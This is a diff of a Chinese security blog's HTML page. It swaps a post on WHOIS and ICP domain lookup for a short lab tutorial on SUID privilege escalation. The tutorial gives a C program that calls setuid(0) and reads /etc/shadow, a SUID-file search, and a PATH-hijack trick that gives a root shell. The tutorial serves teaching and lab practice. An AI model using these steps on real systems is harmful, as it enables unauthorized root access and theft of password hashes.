@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="信息收集之域名收集, Passers-by">
+    <meta name="keywords" content="SUID提权, Passers-by">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>信息收集之域名收集 | Passers-by</title>
+    <title>SUID提权 | Passers-by</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -311,12 +311,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/3.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">信息收集之域名收集</h1>
+                    <h1 class="description center-align post-title">SUID提权</h1>
                 </div>
             </div>
         </div>
@@ -435,12 +435,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-                                <span class="chip bg-color">信息收集</span>
-                            </a>
-                        
-                            <a href="/tags/%E5%9F%9F%E5%90%8D/">
-                                <span class="chip bg-color">域名</span>
+                            <a href="/tags/%E6%8F%90%E6%9D%83/">
+                                <span class="chip bg-color">提权</span>
                             </a>
                         
                     </div>
@@ -451,8 +447,8 @@
                     <div class="post-cate">
                         <i class="fas fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/" class="post-category">
-                                信息收集
+                            <a href="/categories/%E6%8F%90%E6%9D%83/" class="post-category">
+                                提权
                             </a>
                         
                     </div>
@@ -488,20 +484,18 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <div align='center' ><font color=#FF000 size='70'>信息收集之域名收集</font></div>
+                <div align='center' ><font color=#FF000 size='70'>SUID提权</font></div>
 &nbsp;
 
 
 <p><font color=#FF000 size=4 ><strong>本文档只做讲解，请勿用做非法用途，否则后果自负，谢谢！！！</strong></font><br>&nbsp;</p>
-<h2 id="域名"><a href="#域名" class="headerlink" title="域名"></a>域名</h2><p>域名(Domain Name)：<br>&emsp;&emsp;由一串点分隔的名字组成的Internet上某一台计算机或计算机组的名称，用于在数据传输时标识计算机的电子方位<br>&emsp;&emsp;例如<a target="_blank" rel="noopener" href="http://www.baidu.com/">www.baidu.com</a><br>&emsp;&emsp;&emsp;&emsp;其中www是对应的主机头，baidu.com是域名<br>&emsp;&emsp;浏览网站过程：从DNS服务器获得指定域名对应的IP地址</p>
-<h2 id="WHOIS"><a href="#WHOIS" class="headerlink" title="WHOIS"></a>WHOIS</h2><p>&emsp;&emsp;查询域名的IP以及所有者等信息的传输协议。或者说，whois就是一个用来查询域名是否已经被注册，以及注册域名的详细信息的数据库(如域名所有人、域名注册商以及联系电话等)<br>&emsp;&emsp;不同域名后缀的whois信息需要到不同的whois数据库查询。如.com结尾的域名由.com域名运营商VeriSign管理，.cn结尾的域名由CNNIC(中国互联网络信息中心)管理<br>&nbsp;<br>WHOIS协议：<br>&emsp;&emsp;先向WHOIS服务器的TCP端口43建立一个连接，发送查询关键字并加上回车换行，然后接收服务器返回查询结果<br>&emsp;&emsp;通过whois查询可以获得域名注册者邮箱地址等信息。一般情况下中小型网站域名注册者就是网站管理员。利用搜索引擎对whois查询到的信息进行搜索，获取更多域名注册者的个人信息<br>&nbsp;</p>
-<h3 id="查询方法"><a href="#查询方法" class="headerlink" title="查询方法"></a>查询方法</h3><ol>
-<li>   web接口查询：<br>&emsp;&emsp;    <a target="_blank" rel="noopener" href="https://whois.aliyun.com/">https://whois.aliyun.com</a><br>&emsp;&emsp;    <a target="_blank" rel="noopener" href="https://www.whois365.com/cn">https://www.whois365.com/cn</a><br>&emsp;&emsp;    <a target="_blank" rel="noopener" href="http://whois.chinaz.com/">http://whois.chinaz.com</a><br>&emsp;&emsp;    <a target="_blank" rel="noopener" href="https://whois.aizhan.com/">https://whois.aizhan.com</a></li>
-<li>   whois命令查询：<br>Kali Linux下自带whois查询工具<br>&emsp;&emsp;命令：whois [需要查询的域名]</li>
-</ol>
-<h2 id="备案信息"><a href="#备案信息" class="headerlink" title="备案信息"></a>备案信息</h2><p>ICP备案：Internet Content Provider网络内容供应商<br>    &emsp;&emsp;《互联网信息服务管理办法》指出互联网信息服务分为经营性和非经营性两类。国家对经营性互联网信息服务实行许可制度；对非经营性互联网信息服务实行备案制度。未取得许可或者未履行备案手续的，不得从事互联网信息服务。在中华人民共和国境内提供非经营性互联网信息服务，应当依法履行备案手续。未经国家机关单位许可备案，不得在中华人民共和国境内从事非经营性互联网信息服务。<br>&emsp;&emsp;备案好处：为了防止在网上从事非法的网站经营活动，打击不良互联网信息的传播，如果网站不备案，很有可能被查处以后关停<br>&nbsp;</p>
-<h3 id="查询方法-1"><a href="#查询方法-1" class="headerlink" title="查询方法"></a>查询方法</h3><p>web接口查询：<br>&emsp;&emsp;    <a target="_blank" rel="noopener" href="http://www.beianbeian.com/">http://www.beianbeian.com</a><br>&emsp;&emsp;    <a target="_blank" rel="noopener" href="http://www.miitbeian.gov.cn/publish/query/indexFirst.action">http://www.miitbeian.gov.cn/publish/query/indexFirst.action</a><br>&emsp;&emsp;    <a target="_blank" rel="noopener" href="http://www.tianyancha.com/">http://www.tianyancha.com</a></p>
-<p><font color=#FF000 size=4 >&emsp;&emsp;建议使用多种工具进行查询，因为每种工具查询出来的结果不一定相同，所以每个工具查询完之后需要自己进行整理与汇总，从而得出自己需要的信息</font></p>
+<h2 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h2><h3 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h3><p>   1.几乎所有的Linux系统都可以执行<br>   2.无需工具，只需本地编辑文件即可</p>
+<h3 id="缺点"><a href="#缺点" class="headerlink" title="缺点"></a>缺点</h3><p>   1.只是临时提权<br>   2.需要root编辑文件并设置SUID权限</p>
+<h2 id="提权准备"><a href="#提权准备" class="headerlink" title="提权准备"></a>提权准备</h2><h3 id="1-使用root编辑suid-c文件"><a href="#1-使用root编辑suid-c文件" class="headerlink" title="1.使用root编辑suid.c文件"></a>1.使用root编辑suid.c文件</h3><p>#include&lt;stdlib.h&gt;<br>#include &lt;unistd.h&gt;<br>int main()<br>{<br>setuid(0);//run as root<br>system(“id”);<br>system(“cat /etc/shadow”);<br>}<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/1.jpg" alt="suid.c文件内容"></p>
+<h3 id="2-root编译并设置SUID权限"><a href="#2-root编译并设置SUID权限" class="headerlink" title="2.root编译并设置SUID权限"></a>2.root编译并设置SUID权限</h3><p>gcc suid.c -o suid-exp<br>chmod 4775 suid-exp<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/2.jpg" alt="设置SUID权限"><br>S代表suid属性<br>find / -perm -u=s -type f 2&gt;/dev/null<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/3.jpg" alt="查找SUID文件"></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="1-切换普通用户"><a href="#1-切换普通用户" class="headerlink" title="1.切换普通用户"></a>1.切换普通用户</h3><p><img src="/archives/SUID%E6%8F%90%E6%9D%83/4.jpg" alt="切换普通用户"></p>
+<h3 id="2-提权"><a href="#2-提权" class="headerlink" title="2.提权"></a>2.提权</h3><p>echo “/bin/bash” &gt; cat &amp;&amp; chmod 777 cat<br>export PATH=.:$PATH<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/5.jpg" alt="设置环境变量"><br>./suid-exp<br><img src="/archives/SUID%E6%8F%90%E6%9D%83/6.jpg" alt="提权"><br>可以发现此时已经是root用户</p>
+<h2 id="提权测试"><a href="#提权测试" class="headerlink" title="提权测试"></a>提权测试</h2><p><img src="/archives/SUID%E6%8F%90%E6%9D%83/7.jpg" alt="提权测试"><br>可以发现此时可以创建用户了</p>
 
                 
             </div>
@@ -528,7 +522,7 @@
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://passers-by.cn/archives/56dc95ea.html">http://passers-by.cn/archives/56dc95ea.html</a>
+                    <a href="http://passers-by.cn/archives/5c206d0f.html">http://passers-by.cn/archives/5c206d0f.html</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -566,12 +560,8 @@
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/">
-                                    <span class="chip bg-color">信息收集</span>
-                                </a>
-                            
-                                <a href="/tags/%E5%9F%9F%E5%90%8D/">
-                                    <span class="chip bg-color">域名</span>
+                                <a href="/tags/%E6%8F%90%E6%9D%83/">
+                                    <span class="chip bg-color">提权</span>
                                 </a>
                             
                         </div>
@@ -1011,9 +1001,10 @@
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
                 <a href="/archives/5c206d0f.html">
                     <div class="card-image">
@@ -1031,9 +1022,9 @@
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-01-30
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-01-30
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-bookmark fa-fw icon-category"></i>
@@ -1046,6 +1037,7 @@
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
@@ -1061,7 +1053,7 @@
         
         <div class="article col s12 m6" data-aos="fade-up">
             <div class="article-badge right-badge text-color">
-                本篇&nbsp;<i class="far fa-dot-circle"></i>
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
                 <a href="/archives/56dc95ea.html">
@@ -1095,7 +1087,6 @@
                         </span>
                     </div>
                 </div>
-
                 
                 <div class="card-action article-tags">
                     
